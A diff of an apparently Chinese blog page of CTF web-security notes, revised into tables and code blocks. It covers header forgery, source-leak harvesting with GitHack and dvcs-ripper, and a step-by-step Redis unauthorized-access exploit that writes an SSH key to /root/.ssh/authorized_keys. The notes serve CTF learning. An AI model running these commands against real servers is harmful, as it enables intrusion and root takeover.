@@ -473,14 +473,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.4k
+                    1.2k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    5 分
+                    4 分
                 </div>
                 
 
@@ -503,64 +503,178 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="F12"><a href="#F12" class="headerlink" title="F12"></a>F12</h3><p>F12看源码<br>藏flag或hint；</p>
-<h5 id="练习题："><a href="#练习题：" class="headerlink" title="练习题："></a>练习题：</h5><p>bugku-ctf ：web2，计算器；</p>
-<h3 id="Ctrl-u"><a href="#Ctrl-u" class="headerlink" title="Ctrl+u"></a>Ctrl+u</h3><p>F12被禁时，</p>
-<p>或者说url前加view-source:</p>
-<h5 id="练习题：-1"><a href="#练习题：-1" class="headerlink" title="练习题："></a>练习题：</h5><p>xctf：view-source；</p>
-<h3 id="修改前端源码"><a href="#修改前端源码" class="headerlink" title="修改前端源码"></a>修改前端源码</h3><p>一般是小游戏，要求分数；<br>可通过控制台，源码等手段修改；</p>
-<h5 id="练习题：-2"><a href="#练习题：-2" class="headerlink" title="练习题："></a>练习题：</h5><p>xctf：disabled_button；</p>
-<h3 id="抓包和http请求头"><a href="#抓包和http请求头" class="headerlink" title="抓包和http请求头"></a>抓包和http请求头</h3><p>看post和response；</p>
-<p>藏在cookie；flag or hint</p>
-<p>藏在session；flag or hint</p>
-<h5 id="练习题：-3"><a href="#练习题：-3" class="headerlink" title="练习题："></a>练习题：</h5><p>xctf： baby_web，cookie；</p>
-<p>bugku-ctf ：web 基础 $_GET、bugku-ctf ：web 基础$_POST</p>
-<p>响应：<br>bugku-ctf ：你必须让他停下、头等舱；</p>
-<h4 id="请求头修改"><a href="#请求头修改" class="headerlink" title="请求头修改"></a>请求头修改</h4><p>伪造本地 ip 地 址 ，  X-FORWARDED-FOR:127.0.0.1；</p>
-<p>修改cookie值： Cookie   http&#x3D;ad；（键值）</p>
-<p>修改浏览器(User-Agent)   ctfbrowser  (直接放值)</p>
-<p>修改Referer （告诉服务器：「当前这个请求是从哪个页面跳转&#x2F;点击过来的」）     告诉服务器「我从哪来」**——防盗链、CSRF、日志注入、请求头绕过都靠它，CTF 里常用来 <strong>伪造来源 or 塞 Payload</strong>。</p>
-<p><strong><code>Host</code> 告诉服务器「我要访问你哪个虚拟站点」</strong>——虚拟主机路由、SSRF 绕过、缓存污染、头注入；</p>
-<p><strong><code>Via</code> 记录「请求&#x2F;响应经过的代理链」</strong>——追踪路由、缓存绕过、头注入、信息泄露      即代理服务器信息；</p>
-<h5 id="练习题：-4"><a href="#练习题：-4" class="headerlink" title="练习题："></a>练习题：</h5><p>bugku-ctf ：域名解析、管理员系统；</p>
-<h3 id="robots协议"><a href="#robots协议" class="headerlink" title="robots协议"></a>robots协议</h3><p>常⻅信息泄露：robots.txt(机器⼈)，即访问url&#x2F;robots.txt</p>
-<p>Robots协议：它通常告诉⽹络搜索引擎的漫游器（⼜称⽹络蜘蛛），此⽹站中的哪些内容是不应<br>被搜索引擎的漫游器获取的，哪些是可以被漫游器获取的。</p>
-<h5 id="练习题"><a href="#练习题" class="headerlink" title="练习题:"></a>练习题:</h5><p>xctf： Training-WWW-Robots；robots；</p>
-<p>bugku-ctf ：细心、phpcmsV9；</p>
-<h3 id="phps泄露"><a href="#phps泄露" class="headerlink" title="phps泄露"></a>phps泄露</h3><p>phps泄露，访问url&#x2F;index.phps</p>
-<h5 id="练习题：-5"><a href="#练习题：-5" class="headerlink" title="练习题："></a>练习题：</h5><p>xctf： PHP2；</p>
-<h3 id="web源代码泄露"><a href="#web源代码泄露" class="headerlink" title="web源代码泄露"></a>web源代码泄露</h3><h4 id="hg-源码泄漏："><a href="#hg-源码泄漏：" class="headerlink" title=".hg 源码泄漏："></a>.hg 源码泄漏：</h4><p>漏洞成因：hg init 的时候会生成.hg，<a target="_blank" rel="noopener" href="http://www.xx.com/.hg/%EF%BC%8C">http://www.xx.com/.hg/，</a></p>
-<p>工具：dvcs-ripper，（rip-hg.pl -v -u <a target="_blank" rel="noopener" href="http://www.xx.com/.hg/%EF%BC%89">http://www.xx.com/.hg/）</a></p>
-<h4 id="git-源码泄漏："><a href="#git-源码泄漏：" class="headerlink" title=".git 源码泄漏："></a>.git 源码泄漏：</h4><p>漏洞成因：在运行 git init 初始化代码库的时候，会在当前目录下产生一个.git 的隐藏文件，用来记录代码的变更记录等，没有删除这个文件，导致泄漏，<a target="_blank" rel="noopener" href="http://www.xxx.com/.git/config">http://www.xxx.com/.git/config</a></p>
-<p>工具：GitHack，dvcs-ripper，（GitHack.py <a target="_blank" rel="noopener" href="http://www.xxx.com/.git%EF%BC%8Crip-hg.pl">http://www.xxx.com/.git，rip-hg.pl</a> -v -u <a target="_blank" rel="noopener" href="http://www.xx.com/.git/%EF%BC%89">http://www.xx.com/.git/）</a></p>
-<h4 id="DS-Store-源码泄漏："><a href="#DS-Store-源码泄漏：" class="headerlink" title=".DS_Store 源码泄漏："></a>.DS_Store 源码泄漏：</h4><p>漏洞成因：在发布代码时，没有删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息，<a target="_blank" rel="noopener" href="http://www.xxx.com/.ds_store">http://www.xxx.com/.ds_store</a></p>
-<p>工具：dsstoreexp，（python ds_store_exp.py</p>
-<p><a target="_blank" rel="noopener" href="http://www.xxx.com/.DS_Store%EF%BC%89">http://www.xxx.com/.DS_Store）</a></p>
-<h4 id="网站备份压缩文件："><a href="#网站备份压缩文件：" class="headerlink" title="网站备份压缩文件："></a>网站备份压缩文件：</h4><p>在网站的使用过程中，往往需要对网站中的文件进行修改，升级，此时就需要对网站整或其中某一页面进行备份，当备份文件或修改过程中的缓存文件因为各种原因被留在网站 web 目录下，而该目录又没有设置访问权限，就有可能导致备份文件被下载，导致信息泄漏，给服务器安全埋下隐患。.rar， .zip， .7z， .tar.gz， .bak， .swp， .txt， .html，工具：可以使用一些扫描软件，进行扫描，如 awvs 之类的</p>
-<h5 id="练习题：-6"><a href="#练习题：-6" class="headerlink" title="练习题："></a>练习题：</h5><p>xctf：backup；</p>
-<h5 id="swp"><a href="#swp" class="headerlink" title="swp"></a>swp</h5><p>swp是vim编辑器的临时交换⽂件，即swap（交换分区）的简写。是⼀个隐藏⽂件。⽤来备份缓冲区的内容，如果未对⽂件进⾏修改，是不会产⽣swp⽂件的。<br>如果不想产⽣交换⽂件，所以在vim配置中添加set noswapfile所以当异常退出的时候，swp⽂件就会留下了，此时就可以通过缓存⽂件来恢复原始⽂件内容<br>以index.php为例，第⼀次产⽣的为.index.php.swp<br>第⼆次意外退出后产⽣的为 .index.php.swoo<br>第三次为 .index.php.swn<br>注意后.在开头，因为是隐藏⽂件<br>接用 vim -r inde.php 来读取文件</p>
-<h5 id="练习题：-7"><a href="#练习题：-7" class="headerlink" title="练习题："></a>练习题：</h5><p>bugku-ctf ：备份是个好习惯， 导航；</p>
-<h4 id="SVN-导致文件泄漏："><a href="#SVN-导致文件泄漏：" class="headerlink" title=".SVN 导致文件泄漏："></a>.SVN 导致文件泄漏：</h4><p>版本控制系统</p>
-<p>工具：dvcs-ripper，Seay-Svn，（rip-svn.pl -v -u</p>
-<p><a target="_blank" rel="noopener" href="http://www.xxx.com/.svn/%EF%BC%89">http://www.xxx.com/.svn/）</a></p>
-<h4 id="未授权访问漏洞："><a href="#未授权访问漏洞：" class="headerlink" title="未授权访问漏洞："></a>未授权访问漏洞：</h4><p>未授权访问—-应用层服务的问题，服务启动后，没配置任何凭证，导致可以直接进入</p>
-<p>弱口令—配置的密码过于简单常见</p>
-<p>空口令—没配置密码</p>
-<p>目前主要存在未授权访问漏洞的如下：<br>NFS，Samba，LDAP，Rsync，FTP，Gitlab，Jenkins，MongoDB，Redis，ZooKeeper，ElasticSearch，Memcache，CouchDB，Docker，Solr，Hadoop，Dubbo 等，这些都是挖矿勒索的高发地带<br>如：<br>redis 为授权访问漏洞，默认情况下会绑定在 0.0.0.0:6379，这样会将 redis服务暴露到公网上，如果没有开启认证的情况下，可以导致任意用户可以访问目标服务器，可以利用相关方法，在 redis 服务器上写入公钥，进而可以使用对应私钥直接登陆目标服务器。</p>
-<p>1.本地生成公钥私钥ssh-keygen -t rsa</p>
-<p>2.把公钥写入 xx.txt 文件</p>
-<p>(echo -e “\n\n”;cat id_rsa.pub;echo -e “\n\n”) &gt; xx.txt</p>
-<p>3.连接 redis 写入文件</p>
-<p>cat xx.txt | redis-cli -h 192.168.1.2 -x set crackit</p>
-<p>redis-cli -h 192.168.1.2</p>
-<p>192.168.1.2:6379&gt; config set dir &#x2F;root&#x2F;.ssh&#x2F;</p>
-<p>192.168.1.2:6379&gt; config get dir</p>
-<p>1)”dir”</p>
-<p>2)”&#x2F;root&#x2F;.ssh”192.168.1.2:6379&gt; config set dbfilename “authorized_keys”192.168.1.2”6379&gt; save</p>
-<p>也可以使用 msf 里面成熟的 exp 来利用</p>
-<h4 id="sql备份⽂件泄漏"><a href="#sql备份⽂件泄漏" class="headerlink" title="sql备份⽂件泄漏"></a>sql备份⽂件泄漏</h4><h3 id="域名txt记录"><a href="#域名txt记录" class="headerlink" title="域名txt记录"></a>域名txt记录</h3><p>藏在域名的txt记录中，可以使⽤nslookup，也可以使⽤阿⾥云的解析。</p>
-<h3 id="php探针"><a href="#php探针" class="headerlink" title="php探针"></a>php探针</h3><p>探针，考察PHP探针php探针是⽤来探测空间、服务器运⾏状况和PHP信息⽤的，探针可以实时查看服务器硬盘资源、内存占⽤、⽹卡 流量、系统负载、服务器时间等信息。</p>
-<p>访问url&#x2F;tz.php</p>
+                <h2 id="前端源码查看"><a href="#前端源码查看" class="headerlink" title="前端源码查看"></a>前端源码查看</h2><h3 id="F12-查看源码"><a href="#F12-查看源码" class="headerlink" title="F12 查看源码"></a>F12 查看源码</h3><p>直接 F12 查看网页源码，flag 或 hint 通常藏在 HTML 注释或隐藏元素中。</p>
+<h4 id="F12-练习题"><a href="#F12-练习题" class="headerlink" title="F12 练习题"></a>F12 练习题</h4><ul>
+<li>bugku-ctf：web2、计算器</li>
+</ul>
+<h3 id="Ctrl-u-查看源码"><a href="#Ctrl-u-查看源码" class="headerlink" title="Ctrl+u 查看源码"></a>Ctrl+u 查看源码</h3><p>当 F12 被禁用时，可以使用 <code>Ctrl+U</code> 查看源码，或者在 URL 前加 <code>view-source:</code>。</p>
+<h4 id="Ctrl-u-练习题"><a href="#Ctrl-u-练习题" class="headerlink" title="Ctrl+u 练习题"></a>Ctrl+u 练习题</h4><ul>
+<li>xctf：view-source</li>
+</ul>
+<h3 id="修改前端源码"><a href="#修改前端源码" class="headerlink" title="修改前端源码"></a>修改前端源码</h3><p>一般是小游戏要求特定分数才能获取 flag，可通过控制台或源码修改前端变量。</p>
+<h4 id="修改源码练习题"><a href="#修改源码练习题" class="headerlink" title="修改源码练习题"></a>修改源码练习题</h4><ul>
+<li>xctf：disabled_button</li>
+</ul>
+<hr>
+<h2 id="抓包与-HTTP-请求头"><a href="#抓包与-HTTP-请求头" class="headerlink" title="抓包与 HTTP 请求头"></a>抓包与 HTTP 请求头</h2><h3 id="基础抓包"><a href="#基础抓包" class="headerlink" title="基础抓包"></a>基础抓包</h3><p>查看 POST 和 Response，flag 或 hint 可能藏在：</p>
+<ul>
+<li><strong>Cookie</strong>：直接包含 flag 或 hint</li>
+<li><strong>Session</strong>：服务端存储的会话信息</li>
+</ul>
+<h4 id="抓包练习题"><a href="#抓包练习题" class="headerlink" title="抓包练习题"></a>抓包练习题</h4><ul>
+<li>xctf：baby_web、cookie</li>
+<li>bugku-ctf：web 基础 <code>$_GET</code>、web 基础 <code>$_POST</code></li>
+</ul>
+<h3 id="响应头信息"><a href="#响应头信息" class="headerlink" title="响应头信息"></a>响应头信息</h3><h4 id="响应头练习题"><a href="#响应头练习题" class="headerlink" title="响应头练习题"></a>响应头练习题</h4><ul>
+<li>bugku-ctf：你必须让他停下、头等舱</li>
+</ul>
+<h3 id="请求头修改"><a href="#请求头修改" class="headerlink" title="请求头修改"></a>请求头修改</h3><table>
+<thead>
+<tr>
+<th>请求头</th>
+<th>用途</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>X-Forwarded-For</td>
+<td>伪造本地 IP 地址</td>
+<td><code>X-FORWARDED-FOR: 127.0.0.1</code></td>
+</tr>
+<tr>
+<td>Cookie</td>
+<td>修改 Cookie 值</td>
+<td><code>Cookie: http=ad</code></td>
+</tr>
+<tr>
+<td>User-Agent</td>
+<td>修改浏览器标识</td>
+<td><code>User-Agent: ctfbrowser</code></td>
+</tr>
+<tr>
+<td>Referer</td>
+<td>伪造请求来源</td>
+<td><code>Referer: https://www.xxx.com</code></td>
+</tr>
+<tr>
+<td>Host</td>
+<td>指定虚拟站点</td>
+<td><code>Host: target.com</code></td>
+</tr>
+<tr>
+<td>Via</td>
+<td>代理链信息</td>
+<td>用于缓存绕过、头注入</td>
+</tr>
+</tbody></table>
+<p><strong>关键头说明：</strong></p>
+<ul>
+<li><strong>Referer</strong>：告诉服务器「请求从哪来」，CTF 中常用于伪造来源或注入 Payload</li>
+<li><strong>Host</strong>：告诉服务器「访问哪个虚拟站点」，可用于虚拟主机路由、SSRF 绕过</li>
+<li><strong>Via</strong>：记录请求经过的代理链，可用于追踪路由、缓存绕过</li>
+</ul>
+<h4 id="请求头练习题"><a href="#请求头练习题" class="headerlink" title="请求头练习题"></a>请求头练习题</h4><ul>
+<li>bugku-ctf：域名解析、管理员系统</li>
+</ul>
+<hr>
+<h2 id="敏感文件泄露"><a href="#敏感文件泄露" class="headerlink" title="敏感文件泄露"></a>敏感文件泄露</h2><h3 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h3><p>访问 <code>url/robots.txt</code>，查看网站禁止搜索引擎爬取的目录，可能包含敏感路径。</p>
+<blockquote>
+<p>Robots 协议告诉网络蜘蛛哪些内容不应被获取，哪些可以被获取。</p>
+</blockquote>
+<h4 id="robots-练习题"><a href="#robots-练习题" class="headerlink" title="robots 练习题"></a>robots 练习题</h4><ul>
+<li>xctf：Training-WWW-Robots、robots</li>
+<li>bugku-ctf：细心、phpcmsV9</li>
+</ul>
+<h3 id="phps-文件泄露"><a href="#phps-文件泄露" class="headerlink" title="phps 文件泄露"></a>phps 文件泄露</h3><p>访问 <code>url/index.phps</code>，可获取 PHP 源码文件。</p>
+<h4 id="phps-练习题"><a href="#phps-练习题" class="headerlink" title="phps 练习题"></a>phps 练习题</h4><ul>
+<li>xctf：PHP2</li>
+</ul>
+<h3 id="域名-TXT-记录"><a href="#域名-TXT-记录" class="headerlink" title="域名 TXT 记录"></a>域名 TXT 记录</h3><p>flag 可能藏在域名的 TXT 记录中，使用 <code>nslookup</code> 或阿里云解析查看。</p>
+<h3 id="php-探针"><a href="#php-探针" class="headerlink" title="php 探针"></a>php 探针</h3><p>PHP 探针用于探测空间、服务器运行状况和 PHP 信息，可查看硬盘资源、内存占用、网卡流量等。</p>
+<p>访问 <code>url/tz.php</code>。</p>
+<hr>
+<h2 id="Web-源代码泄露"><a href="#Web-源代码泄露" class="headerlink" title="Web 源代码泄露"></a>Web 源代码泄露</h2><h3 id="git-源码泄漏"><a href="#git-源码泄漏" class="headerlink" title=".git 源码泄漏"></a>.git 源码泄漏</h3><p><strong>漏洞成因</strong>：<code>git init</code> 时生成 <code>.git</code> 隐藏文件，未删除导致泄露。</p>
+<p><strong>利用方式</strong>：</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">http://www.xxx.com/.git/config<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><strong>工具</strong>：GitHack、dvcs-ripper</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">GitHack.py http://www.xxx.com/.git
+rip-hg.pl <span class="token parameter variable">-v</span> <span class="token parameter variable">-u</span> http://www.xx.com/.git/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h3 id="hg-源码泄漏"><a href="#hg-源码泄漏" class="headerlink" title=".hg 源码泄漏"></a>.hg 源码泄漏</h3><p><strong>漏洞成因</strong>：<code>hg init</code> 时生成 <code>.hg</code> 目录，未删除导致泄露。</p>
+<p><strong>利用方式</strong>：</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">http://www.xx.com/.hg/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><strong>工具</strong>：dvcs-ripper</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">rip-hg.pl <span class="token parameter variable">-v</span> <span class="token parameter variable">-u</span> http://www.xx.com/.hg/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="DS-Store-源码泄漏"><a href="#DS-Store-源码泄漏" class="headerlink" title=".DS_Store 源码泄漏"></a>.DS_Store 源码泄漏</h3><p><strong>漏洞成因</strong>：发布代码时未删除 <code>.DS_Store</code> 文件，泄露敏感文件名信息。</p>
+<p><strong>利用方式</strong>：</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">http://www.xxx.com/.DS_Store<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><strong>工具</strong>：dsstoreexp</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python ds_store_exp.py http://www.xxx.com/.DS_Store<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="SVN-源码泄漏"><a href="#SVN-源码泄漏" class="headerlink" title=".SVN 源码泄漏"></a>.SVN 源码泄漏</h3><p><strong>漏洞成因</strong>：SVN 版本控制系统文件未删除。</p>
+<p><strong>工具</strong>：dvcs-ripper、Seay-Svn</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">rip-svn.pl <span class="token parameter variable">-v</span> <span class="token parameter variable">-u</span> http://www.xxx.com/.svn/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="网站备份压缩文件"><a href="#网站备份压缩文件" class="headerlink" title="网站备份压缩文件"></a>网站备份压缩文件</h3><p>网站备份文件（<code>.rar</code>、<code>.zip</code>、<code>.7z</code>、<code>.tar.gz</code>、<code>.bak</code>、<code>.swp</code>、<code>.txt</code>、<code>.html</code>）残留在 web 目录下，可被下载导致信息泄露。</p>
+<p><strong>工具</strong>：使用 awvs 等扫描软件。</p>
+<h4 id="swp-文件"><a href="#swp-文件" class="headerlink" title="swp 文件"></a>swp 文件</h4><p>swp 是 Vim 编辑器的临时交换文件（swap），用于备份缓冲区内容。</p>
+<ul>
+<li>第一次产生：<code>.index.php.swp</code></li>
+<li>第二次意外退出：<code>.index.php.swoo</code></li>
+<li>第三次：<code>.index.php.swn</code></li>
+</ul>
+<p>注意 <code>.</code> 在开头，因为是隐藏文件。恢复方式：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> <span class="token parameter variable">-r</span> index.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="备份文件练习题"><a href="#备份文件练习题" class="headerlink" title="备份文件练习题"></a>备份文件练习题</h4><ul>
+<li>xctf：backup</li>
+<li>bugku-ctf：备份是个好习惯、导航</li>
+</ul>
+<hr>
+<h2 id="未授权访问漏洞"><a href="#未授权访问漏洞" class="headerlink" title="未授权访问漏洞"></a>未授权访问漏洞</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><table>
+<thead>
+<tr>
+<th>类型</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>未授权访问</td>
+<td>服务启动后未配置凭证，可直接进入</td>
+</tr>
+<tr>
+<td>弱口令</td>
+<td>密码过于简单常见</td>
+</tr>
+<tr>
+<td>空口令</td>
+<td>未配置密码</td>
+</tr>
+</tbody></table>
+<h3 id="常见存在未授权访问的服务"><a href="#常见存在未授权访问的服务" class="headerlink" title="常见存在未授权访问的服务"></a>常见存在未授权访问的服务</h3><p>NFS、Samba、LDAP、Rsync、FTP、Gitlab、Jenkins、MongoDB、Redis、ZooKeeper、ElasticSearch、Memcache、CouchDB、Docker、Solr、Hadoop、Dubbo</p>
+<h3 id="Redis-未授权访问示例"><a href="#Redis-未授权访问示例" class="headerlink" title="Redis 未授权访问示例"></a>Redis 未授权访问示例</h3><p>默认绑定 <code>0.0.0.0:6379</code>，未开启认证时可任意访问，利用写公钥获取服务器权限。</p>
+<p><strong>利用步骤：</strong></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 1. 本地生成公钥私钥</span>
+ssh-keygen <span class="token parameter variable">-t</span> rsa
+
+<span class="token comment"># 2. 把公钥写入文件</span>
+<span class="token punctuation">(</span>echo <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">;</span> <span class="token function">cat</span> id_rsa.pub<span class="token punctuation">;</span> <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span> <span class="token operator">></span> xx.txt
+
+<span class="token comment"># 3. 连接 Redis 写入文件</span>
+<span class="token function">cat</span> xx.txt <span class="token operator">|</span> redis-cli <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.1.2 <span class="token parameter variable">-x</span> <span class="token builtin class-name">set</span> crackit
+
+<span class="token comment"># 4. 进入 Redis 设置路径</span>
+redis-cli <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.1.2
+config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /root/.ssh/
+config <span class="token builtin class-name">set</span> dbfilename <span class="token string">"authorized_keys"</span>
+save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>也可以使用 MSF 中的 exp 来利用。</p>
+<h3 id="SQL-备份文件泄漏"><a href="#SQL-备份文件泄漏" class="headerlink" title="SQL 备份文件泄漏"></a>SQL 备份文件泄漏</h3><p>数据库备份文件残留在 web 目录下，可被下载获取数据库内容。</p>
 
                 
             </div>
@@ -846,16 +960,16 @@
                         <span class="chip bg-color">RCE</span>
                     </a>
                     
+                    <a href="/tags/Java%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">Java安全</span>
+                    </a>
+                    
                     <a href="/tags/Shiro/">
                         <span class="chip bg-color">Shiro</span>
                     </a>
                     
                     <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
                         <span class="chip bg-color">反序列化</span>
-                    </a>
-                    
-                    <a href="/tags/Java%E5%AE%89%E5%85%A8/">
-                        <span class="chip bg-color">Java安全</span>
                     </a>
                     
                 </div>
@@ -907,12 +1021,12 @@
                         <span class="chip bg-color">漏洞原理</span>
                     </a>
                     
-                    <a href="/tags/Java%E5%AE%89%E5%85%A8/">
-                        <span class="chip bg-color">Java安全</span>
-                    </a>
-                    
                     <a href="/tags/Java/">
                         <span class="chip bg-color">Java</span>
+                    </a>
+                    
+                    <a href="/tags/Java%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">Java安全</span>
                     </a>
                     
                 </div>
@@ -1115,7 +1229,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">48.4k</span>&nbsp;字
+                class="white-color">48.2k</span>&nbsp;字
             
             
             
